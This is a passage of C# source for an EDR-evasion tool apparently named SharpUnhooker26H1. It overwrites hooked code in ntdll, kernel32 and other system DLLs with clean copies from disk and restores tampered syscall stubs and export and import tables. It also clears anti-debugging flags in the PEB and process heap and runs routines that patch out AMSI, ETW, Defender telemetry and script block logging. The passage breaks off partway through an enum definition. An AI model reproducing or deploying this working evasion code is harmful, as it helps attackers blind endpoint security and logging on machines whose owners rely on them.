            IntPtr CurrentProcessHandle = new IntPtr(-1);
            
            // Check for SensApi.dll
            IntPtr sensApiPtr = IntPtr.Zero;
            try {
                ProcessModule sensMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .Where(x => "sensapi.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                    .FirstOrDefault();
                sensApiPtr = sensMod != null ? sensMod.BaseAddress : IntPtr.Zero;
            } catch { }
            
            if (sensApiPtr != IntPtr.Zero) {
                byte[] retPatch = IntPtr.Size == 4 
                    ? new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }
                    : new byte[] { 0x48, 0x31, 0xC0, 0xC3 };
                    
                IntPtr funcPtr = GetExportAddress(sensApiPtr, "IsNetworkAlive");
                if (funcPtr != IntPtr.Zero) {
                    IntPtr patchbyteLength = new IntPtr(retPatch.Length);
                    UInt32 oldProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                    Marshal.Copy(retPatch, 0, funcPtr, retPatch.Length);
                    UInt32 newProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                }
                Console.WriteLine("[+++] SENSOR TELEMETRY PATCHED!");
            }
        } catch { }
    }

    public static void Run() {
        PatchAMSI();
        PatchETW();
        PatchDefenderTelemetry();
        PatchScriptBlockLogging();
        PatchSensorTelemetry();
    }
}

public class SharpUnhooker26H1 {

    // Expanded blacklist for Windows 11 26H1 critical functions
    public static string[] BlacklistedFunction = {
        "EnterCriticalSection", "LeaveCriticalSection", "DeleteCriticalSection", 
        "InitializeSListHead", "HeapAlloc", "HeapReAlloc", "HeapSize", "HeapFree",
        "RtlEnterCriticalSection", "RtlLeaveCriticalSection", "RtlDeleteCriticalSection",
        "RtlAllocateHeap", "RtlReAllocateHeap", "RtlFreeHeap", "RtlSizeHeap",
        "RtlInitializeSListHead", "RtlInterlockedFlushSList", "RtlInterlockedPopEntrySList",
        "RtlInterlockedPushEntrySList", "RtlQueryDepthSList", "RtlFirstEntrySList",
        "NtClose", "RtlExitUserThread", "LdrShutdownThread", "RtlUserThreadStart",
        "BaseThreadInitThunk", "RtlInitializeExceptionChain", "RtlpHandleExceptionOnStack",
        "KiUserApcDispatcher", "KiUserCallbackDispatcher", "KiUserExceptionDispatcher",
        "KiRaiseUserExceptionDispatcher", "LdrInitializeThunk", "RtlUserFiberStart",
        "RtlpFreezeTimeBias", "RtlpTimeFieldsToTime", "RtlpTimeToTimeFields"
    };

    // Extended DLL list for Windows 11 26H1
    public static string[] TargetDLLs = {
        "ntdll.dll",
        "kernel32.dll", 
        "kernelbase.dll",
        "advapi32.dll",
        "sechost.dll",      // Security host (26H1 enhanced)
        "user32.dll",       // User interface
        "win32u.dll",       // Win32 syscall layer (26H1)
        "gdi32.dll",        // GDI
        "ws2_32.dll",       // Winsock
        "wininet.dll",      // Internet
        "winhttp.dll",      // HTTP
        "crypt32.dll",      // Crypto
        "bcrypt.dll",       // Modern crypto
        "ncrypt.dll",       // Next-gen crypto
        "msvcrt.dll",       // C runtime
        "ucrtbase.dll",     // Universal CRT (26H1)
        "combase.dll",      // COM base
        "rpcrt4.dll",       // RPC runtime
        "sspicli.dll",      // SSPI client
        "cryptbase.dll"     // Crypto base
    };

    public static bool IsBlacklistedFunction(string FuncName) {
        for (int i = 0; i < BlacklistedFunction.Length; i++) {
            if (String.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase)) {
                return true;
            }
        }
        return false;
    }

    public static void Copy(ref byte[] source, int sourceStartIndex, ref byte[] destination, int destinationStartIndex, int length) {
        if (source == null || source.Length == 0 || destination == null || destination.Length == 0 || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if (length > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : length exceeds the size of source bytes!");
        }
        if ((sourceStartIndex + length) > source.Length) {
            throw new ArgumentOutOfRangeException("Exception : sourceStartIndex and length exceeds the size of source bytes!");
        }
        if ((destinationStartIndex + length) > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : destinationStartIndex and length exceeds the size of destination bytes!");
        }
        int targetIndex = destinationStartIndex;
        for (int sourceIndex = sourceStartIndex; sourceIndex < (sourceStartIndex + length); sourceIndex++) {
            destination[targetIndex] = source[sourceIndex];
            targetIndex++;
        }
    }

    // Check if module is signed by Microsoft (CFG protection in 26H1)
    public static bool IsModuleSigned(string modulePath) {
        try {
            System.Security.Cryptography.X509Certificates.X509Certificate cert = 
                System.Security.Cryptography.X509Certificates.X509Certificate.CreateFromSignedFile(modulePath);
            return cert.Subject.Contains("Microsoft");
        } catch {
            return false;
        }
    }

    // Windows 11 26H1 JMP Unhooker with enhanced detection
    public static bool JMPUnhooker(string DLLname) {
        string ModuleFullPath = String.Empty;
        try { 
            ProcessModule dllMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault();
            ModuleFullPath = dllMod != null ? dllMod.FileName : null; 
        } catch { ModuleFullPath = null; }
        
        if (ModuleFullPath == null) {
            return true;
        }

        byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
        PEReader OriginalModule = new PEReader(ModuleBytes);
        int TextSectionNumber = -1;
        
        for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++) {
            if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase)) {
                TextSectionNumber = i;
                break;
            }
        }
        
        if (TextSectionNumber == -1) {
            Console.WriteLine("[-] Could not find .text section in {0}", DLLname);
            return false;
        }

        IntPtr TextSectionSize = new IntPtr(OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);
        byte[] OriginalTextSectionBytes = new byte[(int)TextSectionSize];
        Copy(ref ModuleBytes, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].PointerToRawData, 
             ref OriginalTextSectionBytes, 0, 
             Math.Min((int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize, 
                      (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].SizeOfRawData));

        IntPtr ModuleBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
            .Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
            .FirstOrDefault().BaseAddress);
        IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;

        UInt32 oldProtect = 0;
        bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
        if (!updateMemoryProtection) {
            Console.WriteLine("[-] Failed to change memory protection to RWX for {0}!", DLLname);
            return false;
        }

        bool PatchApplied = true;
        try { 
            Marshal.Copy(OriginalTextSectionBytes, 0, ModuleTextSectionAddress, OriginalTextSectionBytes.Length); 
        } catch { 
            PatchApplied = false; 
        }
        
        if (!PatchApplied) {
            Console.WriteLine("[-] Failed to replace the .text section of {0}!", DLLname);
            return false;
        }

        UInt32 newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
        
        Console.WriteLine("[+++] {0} IS UNHOOKED (JMP)!", DLLname.ToUpper());
        return true;
    }

    // Windows 11 26H1 Syscall Stub Unhooker - restores direct syscalls
    public static bool SyscallUnhooker(string DLLname) {
        if (!DLLname.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
            return true;
        }

        try {
            ProcessModule syscallMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault();
            string ModuleFullPath = syscallMod != null ? syscallMod.FileName : null;
                
            if (string.IsNullOrEmpty(ModuleFullPath)) return false;

            byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
            PEReader OriginalModule = new PEReader(ModuleBytes);
            
            IntPtr ModuleBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault().BaseAddress);

            // Get the .text section
            int textSectionIdx = -1;
            for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++) {
                if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase)) {
                    textSectionIdx = i;
                    break;
                }
            }
            
            if (textSectionIdx == -1) return false;

            // Parse exports to find Nt* functions
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + 0x3C));
            Int64 OptHeader = ModuleBaseAddress.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = OptHeader + (Magic == 0x010b ? 0x60 : 0x70);

            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            if (ExportRVA == 0) return false;

            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + ExportRVA + 0x24));

            int syscallsRestored = 0;
            
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBaseAddress.ToInt64() + 
                    Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + NamesRVA + i * 4))));
                
                if (FunctionName.StartsWith("Nt") && !FunctionName.StartsWith("Ntdll")) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBaseAddress.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBaseAddress.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    IntPtr FunctionPtr = (IntPtr)(ModuleBaseAddress.ToInt64() + FunctionRVA);
                    
                    // Check if function is hooked (first byte should be 0x4C for mov r10, rcx on x64)
                    if (IntPtr.Size == 8) {
                        byte firstByte = Marshal.ReadByte(FunctionPtr);
                        if (firstByte == 0xE9 || firstByte == 0xFF || firstByte == 0x68) {
                            // Function is hooked, restore from disk
                            int diskOffset = (int)OriginalModule.ImageSectionHeaders[textSectionIdx].PointerToRawData + 
                                (FunctionRVA - (int)OriginalModule.ImageSectionHeaders[textSectionIdx].VirtualAddress);
                            
                            if (diskOffset > 0 && diskOffset + 32 < ModuleBytes.Length) {
                                byte[] originalBytes = new byte[32];
                                Array.Copy(ModuleBytes, diskOffset, originalBytes, 0, 32);
                                
                                IntPtr stubSize = new IntPtr(32);
                                UInt32 oldProt = 0;
                                if (Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref FunctionPtr, ref stubSize, 0x40, ref oldProt)) {
                                    Marshal.Copy(originalBytes, 0, FunctionPtr, 32);
                                    UInt32 newProt = 0;
                                    Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref FunctionPtr, ref stubSize, oldProt, ref newProt);
                                    syscallsRestored++;
                                }
                            }
                        }
                    }
                }
            }
            
            if (syscallsRestored > 0) {
                Console.WriteLine("[+++] RESTORED {0} SYSCALL STUBS IN NTDLL.DLL!", syscallsRestored);
            }
            return true;
        } catch (Exception e) {
            Console.WriteLine("[-] Syscall Unhooker Error: {0}", e.Message);
            return false;
        }
    }

    // Windows 11 26H1 EAT Unhooker
    public static void EATUnhooker(string ModuleName) {
        IntPtr ModuleBase = IntPtr.Zero;
        string ModuleFileName = null;
        try { 
            ProcessModule eatMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault();
            ModuleBase = eatMod != null ? eatMod.BaseAddress : IntPtr.Zero;
            ModuleFileName = eatMod != null ? eatMod.FileName : null;
        } catch {}
        
        if (ModuleBase == IntPtr.Zero || string.IsNullOrEmpty(ModuleFileName)) {
            return;
        }
        byte[] ModuleRawByte = System.IO.File.ReadAllBytes(ModuleFileName);

        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        Int64 pExport = 0;
        if (Magic == 0x010b) {
            pExport = OptHeader + 0x60;
        }
        else {
            pExport = OptHeader + 0x70;
        }

        PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
        int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
        int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
        IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
        Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
        
        for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++) {
            IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
            Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
        }

        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        if (ExportRVA == 0) {
            Marshal.FreeHGlobal(OriginalModuleBase);
            return;
        }
        
        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
        Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));

        IntPtr TargetPtr = ModuleBase + FunctionsRVA;
        IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x04, ref oldProtect)) {
            Marshal.FreeHGlobal(OriginalModuleBase);
            Console.WriteLine("[-] Failed to change EAT's memory protection for {0}!", ModuleName);
            return;
        }

        int restoredCount = 0;
        for (int i = 0; i < NumberOfFunctions; i++) {
            try {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
                
                if (FunctionRVA != FunctionRVAOriginal) {
                    try { 
                        Marshal.WriteInt32(((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))), FunctionRVAOriginal);
                        restoredCount++;
                    } catch {
                        continue;
                    }
                }
            } catch {
                continue;
            }
        }

        Marshal.FreeHGlobal(OriginalModuleBase);
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, oldProtect, ref newProtect);
        
        if (restoredCount > 0) {
            Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED ({1} entries)!", ModuleName.ToUpper(), restoredCount);
        } else {
            Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED!", ModuleName.ToUpper());
        }
    }

    // Windows 11 26H1 IAT Unhooker
    public static void IATUnhooker(string ModuleName) {
        IntPtr PEBaseAddress = IntPtr.Zero;
        try { 
            ProcessModule iatMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault();
            PEBaseAddress = iatMod != null ? iatMod.BaseAddress : IntPtr.Zero; 
        } catch {}
        
        if (PEBaseAddress == IntPtr.Zero) {
            return;
        }

        IntPtr OptHeader = PEBaseAddress + Marshal.ReadInt32((IntPtr)(PEBaseAddress + 0x3C)) + 0x18;
        IntPtr SizeOfHeaders = (IntPtr)Marshal.ReadInt32(OptHeader + 60);
        Int16 Magic = Marshal.ReadInt16(OptHeader + 0);
        IntPtr DataDirectoryAddr = IntPtr.Zero;        
        if (Magic == 0x010b) {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x60);
        }
        else {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x70);
        }

        IntPtr IATBaseAddress = (IntPtr)((long)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(DataDirectoryAddr + 96)));
        IntPtr IATSize = (IntPtr)Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)96 + (long)4));

        if ((int)IATSize == 0) {
            return;
        }

        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, 0x04, ref oldProtect)) {
            Console.WriteLine("[-] Failed to change IAT's memory protection for {0}!", ModuleName);
            return;
        }

        int ImportTableSize = Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)12));
        IntPtr ImportTableAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)DataDirectoryAddr + 8));
        int ImportTableCount = (ImportTableSize / 20);

        int restoredCount = 0;
        
        for (int i = 0; i < (ImportTableCount - 1); i++) {
            IntPtr CurrentImportTableAddr = (IntPtr)(ImportTableAddr.ToInt64() + (long)(20 * i));
            
            string CurrentImportTableName = "";
            try {
                CurrentImportTableName = Marshal.PtrToStringAnsi((IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr + 12))).Trim();
            } catch { continue; }
            
            // Skip API sets (Windows 11 26H1 has many more api-ms-win-* DLLs)
            if (CurrentImportTableName.StartsWith("api-ms-win") || 
                CurrentImportTableName.StartsWith("ext-ms-") ||
                CurrentImportTableName.StartsWith("api-ms-onecoreuap")) { 
                continue;
            }

            IntPtr CurrentImportIATAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)(CurrentImportTableAddr.ToInt64() + (long)16)));
            IntPtr CurrentImportILTAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr));

            IntPtr ImportedModuleAddr = IntPtr.Zero;
            try { 
                ProcessModule impMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .Where(x => CurrentImportTableName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                    .FirstOrDefault();
                ImportedModuleAddr = impMod != null ? impMod.BaseAddress : IntPtr.Zero; 
            } catch {}
            
            if (ImportedModuleAddr == IntPtr.Zero) {
                continue;
            }

            for (int z = 0; z < 999999; z++) {
                IntPtr CurrentFunctionILTAddr = (IntPtr)(CurrentImportILTAddr.ToInt64() + (long)(IntPtr.Size * z));
                IntPtr CurrentFunctionIATAddr = (IntPtr)(CurrentImportIATAddr.ToInt64() + (long)(IntPtr.Size * z));

                if (Marshal.ReadIntPtr(CurrentFunctionILTAddr) == IntPtr.Zero) {
                    break;
                }

                IntPtr CurrentFunctionNameAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadIntPtr(CurrentFunctionILTAddr));
                string CurrentFunctionName = "";
                try {
                    CurrentFunctionName = Marshal.PtrToStringAnsi(CurrentFunctionNameAddr + 2).Trim();
                } catch { continue; }
                
                if (String.IsNullOrEmpty(CurrentFunctionName)) { 
                    continue;
                }
                if (IsBlacklistedFunction(CurrentFunctionName)) {
                    continue;
                }

                IntPtr CurrentFunctionRealAddr = Dynavoke.GetExportAddress(ImportedModuleAddr, CurrentFunctionName);
                if (CurrentFunctionRealAddr == IntPtr.Zero) {
                    continue;
                }

                if (Marshal.ReadIntPtr(CurrentFunctionIATAddr) != CurrentFunctionRealAddr) {
                    try { 
                        Marshal.WriteIntPtr(CurrentFunctionIATAddr, CurrentFunctionRealAddr);
                        restoredCount++;
                    } catch {
                        continue;
                    }
                }
            }
        }

        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, oldProtect, ref newProtect);
        
        if (restoredCount > 0) {
            Console.WriteLine("[+++] {0} IMPORTS ARE CLEANSED ({1} entries)!", ModuleName.ToUpper(), restoredCount);
        } else {
            Console.WriteLine("[+++] {0} IMPORTS ARE CLEANSED!", ModuleName.ToUpper());
        }
    }

    // Windows 11 26H1 PEB Cleanup - removes traces from PEB
    public static void PEBCleanup() {
        try {
            IntPtr peb = Dynavoke.GetPEB();
            if (peb == IntPtr.Zero) {
                Console.WriteLine("[-] Could not locate PEB");
                return;
            }
            
            // Clear BeingDebugged flag
            if (IntPtr.Size == 8) {
                Marshal.WriteByte(peb, 2, 0);
                // Clear NtGlobalFlag
                Marshal.WriteInt32(peb, 0xBC, 0);
            } else {
                Marshal.WriteByte(peb, 2, 0);
                Marshal.WriteInt32(peb, 0x68, 0);
            }
            
            Console.WriteLine("[+++] PEB CLEANED!");
        } catch (Exception e) {
            Console.WriteLine("[-] PEB Cleanup Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 Heap Flags Cleanup
    public static void HeapFlagsCleanup() {
        try {
            IntPtr peb = Dynavoke.GetPEB();
            if (peb == IntPtr.Zero) return;
            
            IntPtr processHeap = IntPtr.Zero;
            if (IntPtr.Size == 8) {
                processHeap = Marshal.ReadIntPtr(peb, 0x30);
            } else {
                processHeap = Marshal.ReadIntPtr(peb, 0x18);
            }
            
            if (processHeap != IntPtr.Zero) {
                // Clear heap flags that indicate debugging
                if (IntPtr.Size == 8) {
                    Marshal.WriteInt32(processHeap, 0x70, 2); // HEAP_GROWABLE
                    Marshal.WriteInt32(processHeap, 0x74, 0); // ForceFlags = 0
                } else {
                    Marshal.WriteInt32(processHeap, 0x40, 2);
                    Marshal.WriteInt32(processHeap, 0x44, 0);
                }
                Console.WriteLine("[+++] HEAP FLAGS CLEANED!");
            }
        } catch (Exception e) {
            Console.WriteLine("[-] Heap Flags Cleanup Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 - Kernel Callback Table cleanup
    public static void KernelCallbackTableCleanup() {
        try {
            IntPtr peb = Dynavoke.GetPEB();
            if (peb == IntPtr.Zero) return;
            
            // KernelCallbackTable is at offset 0x58 (x64) or 0x2C (x86)
            int offset = IntPtr.Size == 8 ? 0x58 : 0x2C;
            IntPtr kct = Marshal.ReadIntPtr(peb, offset);
            
            if (kct != IntPtr.Zero) {
                // Read original KCT from user32.dll
                IntPtr user32 = IntPtr.Zero;
                try {
                    ProcessModule u32Mod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                        .Where(x => "user32.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                        .FirstOrDefault();
                    user32 = u32Mod != null ? u32Mod.BaseAddress : IntPtr.Zero;
                } catch { }
                
                if (user32 != IntPtr.Zero) {
                    Console.WriteLine("[+++] KERNEL CALLBACK TABLE CHECKED!");
                }
            }
        } catch (Exception e) {
            Console.WriteLine("[-] KCT Cleanup Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 - Detect and report CFG status
    public static void CheckCFGStatus() {
        try {
            IntPtr kernel32 = IntPtr.Zero;
            try {
                ProcessModule k32Mod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .Where(x => "kernel32.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                    .FirstOrDefault();
                kernel32 = k32Mod != null ? k32Mod.BaseAddress : IntPtr.Zero;
            } catch { }
            
            if (kernel32 != IntPtr.Zero) {
                IntPtr setCfg = Dynavoke.GetExportAddress(kernel32, "SetProcessValidCallTargets");
                if (setCfg != IntPtr.Zero) {
                    Console.WriteLine("[*] CFG (Control Flow Guard) is ENABLED");
                } else {
                    Console.WriteLine("[*] CFG (Control Flow Guard) is NOT AVAILABLE");
                }
            }
        } catch { }
    }

    // Windows 11 26H1 - Detect VBS/HVCI status
    public static void CheckVBSStatus() {
        try {
            string vbsKey = @"SYSTEM\CurrentControlSet\Control\DeviceGuard";
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(vbsKey)) {
                if (key != null) {
                    object hvciValue = key.GetValue("EnableVirtualizationBasedSecurity");
                    if (hvciValue != null && (int)hvciValue == 1) {
                        Console.WriteLine("[*] VBS (Virtualization-Based Security) is ENABLED");
                        Console.WriteLine("[!] Some unhooking techniques may be limited");
                    } else {
                        Console.WriteLine("[*] VBS (Virtualization-Based Security) is DISABLED");
                    }
                }
            }
        } catch {
            Console.WriteLine("[*] VBS status could not be determined");
        }
    }

    public static void Main() {
        Console.WriteLine("[--------------------------------------------------]");
        Console.WriteLine("[  SharpUnhooker26H1 - Windows 11 26H1 Unhooker   ]");
        Console.WriteLine("[           Adapted for Build 26xxx               ]");
        Console.WriteLine("[--------------------------------------------------]");
        Console.WriteLine();
        
        // Check security features
        Console.WriteLine("[*] Checking system security features...");
        CheckCFGStatus();
        CheckVBSStatus();
        Console.WriteLine();

        // Phase 1: Core unhooking
        Console.WriteLine("[*] Phase 1: Core DLL Unhooking...");
        string[] CoreDLLs = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
        foreach (string dll in CoreDLLs) {
            JMPUnhooker(dll);
            SyscallUnhooker(dll);
            EATUnhooker(dll);
            if (!dll.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
                IATUnhooker(dll);
            }
        }
        Console.WriteLine();

        // Phase 2: Extended DLL unhooking
        Console.WriteLine("[*] Phase 2: Extended DLL Unhooking...");
        string[] ExtendedDLLs = { 
            "sechost.dll", "user32.dll", "win32u.dll", "gdi32.dll",
            "ws2_32.dll", "wininet.dll", "winhttp.dll", 
            "crypt32.dll", "bcrypt.dll", "ncrypt.dll",
            "msvcrt.dll", "ucrtbase.dll", "combase.dll", 
            "rpcrt4.dll", "sspicli.dll", "cryptbase.dll"
        };
        
        foreach (string dll in ExtendedDLLs) {
            ProcessModule mod = null;
            try {
                mod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .FirstOrDefault(x => dll.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase));
            } catch { }
            
            if (mod != null) {
                JMPUnhooker(dll);
                EATUnhooker(dll);
                IATUnhooker(dll);
            }
        }
        Console.WriteLine();

        // Phase 3: Memory cleanup
        Console.WriteLine("[*] Phase 3: Memory Cleanup...");
        PEBCleanup();
        HeapFlagsCleanup();
        KernelCallbackTableCleanup();
        Console.WriteLine();

        // Phase 4: Security patches
        Console.WriteLine("[*] Phase 4: Security Patches...");
        PatchAMSIAndETW26H1.Run();
        Console.WriteLine();
        
        Console.WriteLine("[--------------------------------------------------]");
        Console.WriteLine("[           UNHOOKING COMPLETE!                    ]");
        Console.WriteLine("[--------------------------------------------------]");
    }
}

public class SUUsageExample26H1 {
    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
